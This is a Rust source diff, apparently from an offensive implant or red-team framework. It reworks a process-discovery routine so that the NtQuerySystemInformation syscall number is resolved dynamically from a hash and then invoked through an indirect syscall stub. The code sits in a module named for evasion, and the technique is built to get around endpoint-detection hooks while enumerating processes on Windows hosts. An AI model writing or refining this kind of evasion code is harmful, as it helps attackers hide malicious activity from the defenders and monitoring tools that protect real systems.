@@ -1,10 +1,10 @@
+use crate::techniques::evasion::execution::dinamic_ssn::get_dinamic_ssn;
 use crate::techniques::evasion::execution::indirect_syscall::indirect_syscall_6;
 use crate::utils::UnicodeString;
 use std::alloc::{Layout, alloc, dealloc};
 use std::ffi::c_void;
 
 const SYSTEM_PROCESS_INFORMATION_CLASS: usize = 5;
-const NT_QUERY_SYSTEM_INFORMATION_SSN: u32 = 0x0036;
 const NT_QUERY_SYSTEM_INFORMATION_HASH: u32 = 0xc3d78064;
 
 #[derive(Debug, Clone, Copy)]
@@ -71,74 +71,6 @@ pub struct ProcessInfo {
     pub other_transfer_count: i64,
 }
 
-fn indirect_call_nt_query_system_information() -> Result<Vec<u8>, String> {
-    let mut return_length: usize = 0;
-    let mut status = unsafe {
-        indirect_syscall_6(
-            NT_QUERY_SYSTEM_INFORMATION_HASH,
-            NT_QUERY_SYSTEM_INFORMATION_SSN,
-            SYSTEM_PROCESS_INFORMATION_CLASS,
-            0,
-            0,
-            &mut return_length as *mut usize as usize,
-            0,
-            0,
-        )
-        .unwrap_or(-1)
-    };
-
-    if status as u32 != 0xC0000004 {
-        #[cfg(debug_assertions)]
-        println!(
-            "Se esperaba LENGTH_MISMATCH, pero se obtuvo: 0x{:X}",
-            status
-        );
-        return Err(format!(
-            "Se esperaba LENGTH_MISMATCH, pero se obtuvo: 0x{:X}",
-            status
-        ));
-    }
-
-    let buffer_size = return_length as usize + 0x2000; // margen de seguridad
-    let layout = Layout::from_size_align(buffer_size, 8).map_err(|e| e.to_string())?;
-    let buffer_ptr = unsafe { alloc(layout) };
-
-    if buffer_ptr.is_null() {
-        return Err("Error al asignar memoria para el búfer".to_string());
-    }
-    status = unsafe {
-        indirect_syscall_6(
-            NT_QUERY_SYSTEM_INFORMATION_HASH,
-            NT_QUERY_SYSTEM_INFORMATION_SSN,
-            SYSTEM_PROCESS_INFORMATION_CLASS,
-            buffer_ptr as usize,
-            buffer_size,
-            &mut return_length as *mut usize as usize,
-            0,
-            0,
-        )
-        .unwrap_or(-1)
-    };
-
-    if status != 0 {
-        unsafe { dealloc(buffer_ptr, layout) };
-        #[cfg(debug_assertions)]
-        println!(
-            "La segunda llamada de indirect_call_nt_query_system_information falló con status: 0x{:X}",
-            status
-        );
-        return Err(format!(
-            "La segunda llamada de indirect_call_nt_query_system_information falló con status: 0x{:X}",
-            status
-        ));
-    }
-
-    let data = unsafe { std::slice::from_raw_parts(buffer_ptr, buffer_size).to_vec() };
-    unsafe { dealloc(buffer_ptr, layout) };
-
-    Ok(data)
-}
-
 pub fn parse_process_data(buffer: &[u8]) -> Option<Vec<ProcessInfo>> {
     let mut current_offset = 0;
     let mut processes = Vec::new();
@@ -198,10 +130,76 @@ pub fn parse_process_data(buffer: &[u8]) -> Option<Vec<ProcessInfo>> {
         Some(processes)
     }
 }
+
 pub fn process_discovery() -> Result<Vec<ProcessInfo>, String> {
-    let result = indirect_call_nt_query_system_information();
-    match result {
-        Ok(data) => parse_process_data(&data).ok_or("Error al parsear los datos".to_string()),
-        Err(e) => Err(e),
+    let ssn = get_dinamic_ssn(NT_QUERY_SYSTEM_INFORMATION_HASH)?;
+    let mut return_length: usize = 0;
+    let mut status = unsafe {
+        indirect_syscall_6(
+            NT_QUERY_SYSTEM_INFORMATION_HASH,
+            ssn,
+            SYSTEM_PROCESS_INFORMATION_CLASS,
+            0,
+            0,
+            &mut return_length as *mut usize as usize,
+            0,
+            0,
+        )
+        .unwrap_or(-1)
+    };
+
+    if status as u32 != 0xC0000004 {
+        #[cfg(debug_assertions)]
+        println!(
+            "Se esperaba LENGTH_MISMATCH, pero se obtuvo: 0x{:X}",
+            status
+        );
+        return Err(format!(
+            "Se esperaba LENGTH_MISMATCH, pero se obtuvo: 0x{:X}",
+            status
+        ));
     }
+
+    let buffer_size = return_length as usize + 0x2000; // margen de seguridad
+    let layout = Layout::from_size_align(buffer_size, 8).map_err(|e| e.to_string())?;
+    let buffer_ptr = unsafe { alloc(layout) };
+
+    if buffer_ptr.is_null() {
+        return Err("Error al asignar memoria para el búfer".to_string());
+    }
+    status = unsafe {
+        indirect_syscall_6(
+            NT_QUERY_SYSTEM_INFORMATION_HASH,
+            ssn,
+            SYSTEM_PROCESS_INFORMATION_CLASS,
+            buffer_ptr as usize,
+            buffer_size,
+            &mut return_length as *mut usize as usize,
+            0,
+            0,
+        )
+        .unwrap_or(-1)
+    };
+
+    if status != 0 {
+        unsafe { dealloc(buffer_ptr, layout) };
+        #[cfg(debug_assertions)]
+        println!(
+            "La segunda llamada de NtQuerySystemInformation falló con status: 0x{:X}",
+            status
+        );
+        return Err(format!(
+            "La segunda llamada de NtQuerySystemInformation falló con status: 0x{:X}",
+            status
+        ));
+    }
+
+    let buffer_slice = unsafe { std::slice::from_raw_parts(buffer_ptr, buffer_size) };
+
+    let parsed_processes =
+        parse_process_data(buffer_slice).ok_or_else(|| "Error al parsear los datos".to_string());
+
+    unsafe { dealloc(buffer_ptr, layout) };
+
+    parsed_processes
 }
